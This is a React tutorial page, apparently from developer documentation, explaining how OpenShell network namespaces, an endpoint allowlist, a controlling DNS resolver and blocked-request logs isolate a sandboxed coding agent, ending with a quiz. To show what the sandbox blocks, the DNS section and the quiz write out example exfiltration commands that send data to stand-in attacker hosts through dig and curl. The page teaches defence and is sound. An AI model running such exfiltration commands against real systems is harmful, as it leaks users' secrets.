import { CodeBlock, NoteBlock, DefinitionBlock, ArchitectureDiagram, WarningBlock, ExerciseBlock, ReferenceList } from '../../../components/content';

export default function NetworkNamespaces() {
  return (
    <div className="space-y-6">
      <h1 className="text-3xl font-bold text-gray-900 dark:text-gray-100">
        Network Namespaces
      </h1>

      <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
        The third pillar of OpenShell isolation is network namespaces. While Landlock
        controls filesystem access and seccomp controls syscalls, network namespaces
        control network access. A sandboxed agent gets its own complete network stack --
        its own interfaces, routing table, iptables rules, and DNS resolver -- completely
        separate from the host's network.
      </p>

      <DefinitionBlock
        term="Network Namespace"
        definition="A Linux kernel feature that provides an isolated instance of the network stack. Each network namespace has its own network interfaces, IP addresses, routing tables, firewall rules, and socket ports. Processes in different network namespaces cannot communicate with each other unless explicitly bridged."
        example="The sandbox sees only a 'lo' interface and a 'veth-sandbox' interface. The host's eth0, Wi-Fi, and all other interfaces are invisible."
        seeAlso={['veth pair', 'iptables', 'DNS resolution', 'OpenShell Gateway']}
      />

      <h2 className="text-2xl font-semibold text-gray-800 dark:text-gray-200">
        Isolation Architecture
      </h2>

      <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
        When OpenShell creates a sandbox, it creates a new network namespace and
        connects it to the host namespace through a veth (virtual Ethernet) pair. The
        host side of the veth pair is connected to the OpenShell gateway process, which
        acts as the sole network bridge between the sandbox and the outside world.
      </p>

      <ArchitectureDiagram
        title="Network Namespace Architecture"
        components={[
          { name: 'Sandbox Namespace', description: 'lo + veth-sandbox', color: 'orange' },
          { name: 'veth pair', description: 'Virtual ethernet bridge', color: 'gray' },
          { name: 'Host Namespace', description: 'Full network access', color: 'blue' },
          { name: 'OpenShell Gateway', description: 'Allowlist enforcer', color: 'green' },
          { name: 'Internet', description: 'External endpoints', color: 'red' },
        ]}
        connections={[
          { from: 'Sandbox Namespace', to: 'veth pair', label: 'sandbox-side veth' },
          { from: 'veth pair', to: 'Host Namespace', label: 'host-side veth' },
          { from: 'Host Namespace', to: 'OpenShell Gateway', label: 'packet filter' },
          { from: 'OpenShell Gateway', to: 'Internet', label: 'only whitelisted' },
        ]}
      />

      <h2 className="text-2xl font-semibold text-gray-800 dark:text-gray-200">
        What the Sandbox Sees
      </h2>

      <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
        From inside the sandbox, the network looks very different from the host:
      </p>

      <CodeBlock
        title="Network interfaces inside the sandbox"
        language="bash"
        code={`# Inside the sandbox
$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: veth-sandbox@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.200.0.2/24 scope global veth-sandbox

$ ip route
default via 10.200.0.1 dev veth-sandbox
10.200.0.0/24 dev veth-sandbox proto kernel scope link src 10.200.0.2

# The host's real interfaces are invisible
$ ip addr | grep eth0
# (no output)

$ ip addr | grep wlan0
# (no output)`}
      />

      <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
        The sandbox has a single default route pointing to 10.200.0.1, which is the
        OpenShell gateway. Every packet leaving the sandbox goes through this gateway,
        where it is inspected against the network allowlist.
      </p>

      <h2 className="text-2xl font-semibold text-gray-800 dark:text-gray-200">
        Endpoint Whitelisting
      </h2>

      <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
        The OpenShell gateway does not forward all traffic. It maintains an allowlist
        of endpoints that the sandbox is permitted to contact. Any traffic to an
        endpoint not on the list is dropped, and the attempt is logged for the operator
        to review.
      </p>

      <CodeBlock
        title="Network allowlist policy"
        language="yaml"
        code={`# .nemoclaw/policies/network.yaml
network:
  # Endpoints the sandbox can reach
  allowlist:
    - host: inference.local
      port: 443
      comment: "LLM inference gateway (always required)"

    - host: pypi.org
      port: 443
      comment: "Python package index (for pip install)"

    - host: files.pythonhosted.org
      port: 443
      comment: "Python package downloads"

    - host: registry.npmjs.org
      port: 443
      comment: "NPM package registry"

    - host: github.com
      port: 443
      comment: "Git operations"

    - host: "*.githubusercontent.com"
      port: 443
      comment: "GitHub raw content and releases"

  # Default action for non-whitelisted traffic
  default: deny

  # Log blocked attempts for operator review
  log_blocked: true`}
      />

      <NoteBlock type="info" title="inference.local Is Always Allowed">
        The <code>inference.local</code> endpoint is always in the allowlist regardless
        of policy configuration. This ensures the agent can always reach the LLM
        inference gateway. Without it, the agent would be unable to function as a
        coding assistant. This endpoint resolves to the OpenShell gateway itself, so
        the traffic never leaves the host.
      </NoteBlock>

      <h2 className="text-2xl font-semibold text-gray-800 dark:text-gray-200">
        DNS Resolution Control
      </h2>

      <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
        DNS is a common exfiltration vector -- an attacker can encode data in DNS queries
        to bypass network restrictions. OpenShell addresses this by running its own DNS
        resolver inside the sandbox's network namespace. This resolver only resolves
        hostnames that appear in the network allowlist. All other DNS queries return
        NXDOMAIN.
      </p>

      <CodeBlock
        title="DNS resolution inside the sandbox"
        language="bash"
        code={`# Whitelisted hostname resolves normally
$ dig pypi.org +short
151.101.0.223

# The special inference endpoint resolves to the gateway
$ dig inference.local +short
10.200.0.1

# Non-whitelisted hostname fails
$ dig evil-exfil-server.example.com +short
# (no output -- NXDOMAIN)

# DNS-based exfiltration is blocked
$ dig $(echo "stolen-data" | base64).attacker.com +short
# (no output -- NXDOMAIN)

# Check /etc/resolv.conf -- points to the OpenShell resolver
$ cat /etc/resolv.conf
nameserver 10.200.0.1
# This is the OpenShell gateway acting as a DNS proxy`}
      />

      <WarningBlock title="Wildcard Patterns Require Caution">
        Network allowlist entries support wildcard patterns (e.g.,{' '}
        <code>*.githubusercontent.com</code>). Use wildcards sparingly -- a pattern
        like <code>*.com</code> would effectively disable network isolation. Each
        wildcard entry should be as specific as possible. NemoClaw will warn if a
        wildcard pattern is overly broad.
      </WarningBlock>

      <h2 className="text-2xl font-semibold text-gray-800 dark:text-gray-200">
        Blocked Request Logging
      </h2>

      <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
        When the gateway blocks a network request, it logs the attempt with full
        details: timestamp, source process, destination host and port, and the matching
        rule (or lack thereof). These logs are visible in the OpenShell TUI and can be
        reviewed by the operator to decide whether to update the allowlist.
      </p>

      <CodeBlock
        title="Blocked request log entries"
        language="bash"
        code={`$ openshell term --view=network
Network Activity Log:
  14:23:01  ALLOW  python3 -> pypi.org:443 (rule: pypi.org)
  14:23:02  ALLOW  python3 -> files.pythonhosted.org:443 (rule: files.pythonhosted.org)
  14:23:15  BLOCK  python3 -> api.openai.com:443 (no matching rule)
  14:23:15  BLOCK  curl -> 203.0.113.50:8080 (no matching rule)
  14:23:22  ALLOW  git -> github.com:443 (rule: github.com)

Blocked requests: 2 (review with 'openshell approve')`}
      />

      <NoteBlock type="tip" title="Operator Approval Queue">
        Blocked network requests are added to an approval queue visible in the TUI.
        The operator can review each blocked request and, if appropriate, add the
        endpoint to the allowlist with a single keypress. This makes it easy to
        iteratively refine network policies without editing YAML files manually.
      </NoteBlock>

      <ExerciseBlock
        question="An agent inside the sandbox runs 'curl https://attacker.com/exfil?data=secret'. What happens?"
        options={[
          'The request succeeds because curl is an allowed binary',
          'DNS resolution for attacker.com fails (NXDOMAIN) because it is not in the allowlist, and even if the IP were hardcoded, the gateway would drop the packet',
          'The request is redirected to inference.local',
          'OpenShell modifies the response to remove sensitive data',
        ]}
        correctIndex={1}
        explanation="Two layers block this attack. First, the OpenShell DNS resolver returns NXDOMAIN for attacker.com because it is not in the allowlist. Second, even if the attacker hardcodes an IP address, the gateway inspects outbound connections and drops any traffic to endpoints not on the allowlist. Both the DNS query and the direct connection attempt are logged for operator review."
      />

      <ReferenceList
        references={[
          {
            title: 'Linux Network Namespaces',
            url: 'https://man7.org/linux/man-pages/man7/network_namespaces.7.html',
            type: 'docs',
            description: 'Linux man page for network namespaces.',
          },
          {
            title: 'OpenShell Network Isolation',
            url: 'https://docs.nvidia.com/openshell/networking',
            type: 'docs',
            description: 'Configuring network allowlists and DNS resolution in OpenShell.',
          },
        ]}
      />
    </div>
  );
}
